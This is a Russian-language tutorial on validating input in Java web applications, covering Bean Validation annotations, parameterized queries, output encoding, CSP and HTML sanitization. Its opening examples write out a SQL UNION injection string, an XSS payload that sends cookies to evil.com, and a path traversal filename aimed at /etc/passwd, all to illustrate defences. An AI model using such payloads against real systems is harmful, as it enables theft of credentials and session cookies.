# Валидация входных данных в Java

## Часть 1: Зачем нужна валидация?

Представь, что ты ведёшь приём в больнице. Каждый пациент заполняет анкету. Что будет, если не проверять, что написано?
- В поле «возраст» написано «abc» — система сломается
- В поле «адрес» написано 10000 символов — память переполнится
- В поле «фамилия» вставлен SQL-код — база данных удалится
- В поле «комментарий» вставлен JavaScript — другие пациенты увидят всплывающее окно

**Валидация входных данных** — это проверка: данные соответствуют ожиданиям? Корректны? Безопасны?

Без валидации приложение принимает что угодно. Это приводит к:
- **SQL Injection** — внедрение SQL-кода
- **XSS** — внедрение JavaScript
- **Path Traversal** — доступ к файлам системы
- **Buffer Overflow** — переполнение буфера
- **DoS** — отказ в обслуживании через перегрузку

## Ситуации из реальной жизни

### Ситуация 1: SQL Injection через поиск

Пользователь вводит в поисковую строку:

    ' UNION SELECT username, password FROM users--

Если приложение просто вставляет строку в запрос:

    String query = "SELECT * FROM products WHERE name = '" + userInput + "'";

Результат:

    SELECT * FROM products WHERE name = '' 
    UNION SELECT username, password FROM users--'

Пользователь получает все логины и пароли.

### Ситуация 2: XSS через комментарий

Пользователь оставляет комментарий:

    <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

Если комментарий отображается без обработки — JavaScript выполнится в браузере каждого посетителя. Cookie уйдут злоумышленнику.

### Ситуация 3: Path Traversal через загрузку файла

Пользователь загружает файл с именем:

    ../../../etc/passwd

Если приложение сохраняет файл по пути:

    /uploads/ + filename

Результат:

    /uploads/../../../etc/passwd = /etc/passwd

Файл системы перезаписан.

## Часть 2: Типы валидации

### Синтаксическая валидация

Проверка формата данных.

| Что проверяем | Пример | Как |
|----------------|--------|-----|
| Тип | Это число? | `Integer.parseInt()` |
| Длина | Не длиннее 100 символов | `String.length() <= 100` |
| Формат | Email, телефон | Regex |
| Диапазон | Число от 1 до 100 | `value >= 1 && value <= 100` |
| Набор символов | Только буквы и цифры | Regex `^[a-zA-Z0-9]+$` |
| Обязательность | Поле не пустое | `!= null && !isEmpty()` |

### Семантическая валидация

Проверка смысла данных.

| Что проверяем | Пример | Как |
|----------------|--------|-----|
| Бизнес-логика | Дата рождения в прошлом | `birthDate.isBefore(LocalDate.now())` |
| Уникальность | Email не занят | Запрос в БД |
| Существование | ID товара существует | Запрос в БД |
| Права | Пользователь может это? | Проверка авторизации |
| Ссылочная целостность | ID категории существует | Внешний ключ или запрос |

### Whitelist vs Blacklist

| Подход | Описание | Пример | Безопасность |
|--------|----------|--------|--------------|
| **Whitelist** | Разрешить только известное хорошее | «Только буквы русского и английского алфавита» | ✅ Высокая |
| **Blacklist** | Запретить известное плохое | «Запретить символы < > ' "» | ❌ Низкая |

**Whitelist предпочтительнее.** Невозможно знать все плохие входные данные. Но можно определить, что является хорошим.

Пример whitelist для имени пользователя:

    // Разрешены только буквы, цифры, пробел, дефис
    String name = request.getParameter("name");
    if (!name.matches("^[a-zA-Zа-яА-Я0-9\\s\\-]+$")) {
        throw new ValidationException("Invalid name format");
    }

## Часть 3: Bean Validation (JSR-380)

### Аннотации валидации

    import javax.validation.constraints.*;
    
    public class UserRegistration {
        
        @NotNull(message = "Name is required")
        @Size(min = 2, max = 50, message = "Name must be 2-50 characters")
        @Pattern(regexp = "^[a-zA-Zа-яА-Я\\s\\-]+$", message = "Invalid characters")
        private String name;
        
        @NotNull(message = "Email is required")
        @Email(message = "Invalid email format")
        private String email;
        
        @Min(value = 18, message = "Must be at least 18")
        @Max(value = 120, message = "Invalid age")
        private int age;
        
        @Pattern(regexp = "^\\+?[0-9\\s\\-]{10,20}$", message = "Invalid phone")
        private String phone;
        
        @AssertTrue(message = "Must accept terms")
        private boolean termsAccepted;
    }

### Использование в контроллере

    @PostMapping("/register")
    public ResponseEntity<?> register(
            @Valid @RequestBody UserRegistration request,
            BindingResult result) {
        
        if (result.hasErrors()) {
            return ResponseEntity.badRequest()
                .body(result.getAllErrors());
        }
        
        userService.register(request);
        return ResponseEntity.ok("Registered");
    }

### Группы валидации

    public interface CreateGroup {}
    public interface UpdateGroup {}
    
    public class User {
        @Null(groups = CreateGroup.class)  // При создании ID должен быть null
        @NotNull(groups = UpdateGroup.class)  // При обновлении — обязателен
        private Long id;
        
        @NotNull(groups = {CreateGroup.class, UpdateGroup.class})
        private String name;
    }
    
    // Использование
    @PostMapping
    public User create(@Validated(CreateGroup.class) @RequestBody User user) { }
    
    @PutMapping
    public User update(@Validated(UpdateGroup.class) @RequestBody User user) { }

## Часть 4: Защита от SQL Injection

### Проблема

    // ❌ НЕПРАВИЛЬНО — конкатенация строк
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);

### Решение: PreparedStatement

    // ✅ ПРАВИЛЬНО — параметризованный запрос
    String query = "SELECT * FROM users WHERE username = ?";
    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, username);  // Экранирование происходит автоматически
    ResultSet rs = pstmt.executeQuery();

Почему это безопасно:
- Параметры обрабатываются отдельно от SQL-команды
- Спецсимволы (`'`, `"`, `;`, `--`) экранируются
- Структура запроса не может быть изменена

### Использование ORM

    // JPA/Hibernate
    @Query("SELECT u FROM User u WHERE u.username = :username")
    User findByUsername(@Param("username") String username);
    
    // Spring Data JPA
    List<User> findByUsername(String username);  // Автоматически параметризовано

### Ручное экранирование (последний резорт)

Если невозможно использовать PreparedStatement:

    String safe = username.replace("'", "''");  // Удвоить апостроф

**Но лучше использовать ORM или PreparedStatement.**

## Часть 5: Защита от XSS

### Output Encoding

Данные, выводимые пользователю, должны быть закодированы.

| Контекст | Кодирование | Пример |
|----------|-------------|--------|
| HTML | HTML entities | `<` → `&lt;` |
| JavaScript | JS escaping | `"` → `\\"` |
| CSS | CSS escaping | `<` → `\\3c ` |
| URL | URL encoding | `space` → `%20` |
| XML | XML entities | `<` → `&lt;` |

    import org.springframework.web.util.HtmlUtils;
    
    // Кодирование для HTML
    String safe = HtmlUtils.htmlEscape(userInput);
    // <script> → &lt;script&gt; — не выполнится

### Content Security Policy (CSP)

Заголовок HTTP, ограничивающий источники контента:

    Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'

Это означает: «Выполнять JavaScript только с нашего сайта».

## Часть 6: Sanitization

### HTML Sanitization

Если пользователь вводит HTML (например, в редакторе статьи), нужно удалить опасные теги:

| Библиотека | Описание |
|------------|----------|
| OWASP Java HTML Sanitizer | Удаляет опасные теги, оставляет безопасные |
| jsoup | Парсинг и очистка HTML |

    // OWASP Java HTML Sanitizer
    PolicyFactory policy = new HtmlPolicyBuilder()
        .allowElements("a", "b", "i", "p", "br")
        .allowAttributes("href").onElements("a")
        .toFactory();
    
    String safeHtml = policy.sanitize(userInput);
    // <script>alert('xss')</script> → удалено
    // <b>жирный</b> → оставлено

### URL Validation

    // Проверка URL
    URL url = new URL(userInput);
    if (!url.getHost().endsWith("trusted-domain.com")) {
        throw new ValidationException("Invalid URL");
    }
    
    // Или whitelist протоколов
    if (!url.getProtocol().equals("https")) {
        throw new ValidationException("Only HTTPS allowed");
    }

## Лучшие практики

| Практика | Описание |
|----------|----------|
| Всегда валидировать на сервере | Клиентскую валидацию можно обойти |
| Whitelist подход | Разрешить только известное хорошее |
| Fail fast | Отклонить сразу, не пытаться исправить |
| Не доверять входу | Любой вход — потенциально вредоносный |
| Layered defense | Валидация + параметризация + кодирование |
| Не логировать чувствительные данные | Пароли, карты, токены |
| Использовать стандартные библиотеки | OWASP, Spring Validation |

### Чек-лист безопасности

| Проверка | Статус |
|----------|--------|
| Все входные данные валидируются | ⬜ |
| Используются PreparedStatement / ORM | ⬜ |
| Output encoding при выводе | ⬜ |
| CSP заголовок настроен | ⬜ |
| HTML sanitized где нужно | ⬜ |
| Файлы проверяются на тип и размер | ⬜ |
| URL валидируются | ⬜ |
| Ошибки не раскрывают внутреннюю информацию | ⬜ |

### Комплаенс

| Стандарт | Требование | Реализация |
|----------|------------|------------|
| OWASP Top 10 | A03: Injection | PreparedStatement, ORM |
| PCI DSS | Защита от XSS | Output encoding, CSP |
| GDPR | Защита данных | Валидация + шифрование |
| ISO 27001 | Контроль входных данных | Валидация на всех уровнях |

## Вывод

Валидация — первая линия обороны:
1. **Синтаксическая** — формат, тип, длина
2. **Семантическая** — смысл, бизнес-логика
3. **Whitelist** — разрешить только хорошее
4. **Параметризация** — защита от SQL Injection
5. **Кодирование** — защита от XSS
6. **Sanitization** — очистка HTML

Правило: **никогда не доверяй пользовательскому вводу. Валидируй всё.**

---
_Статья создана на основе анализа материалов Habr по валидации_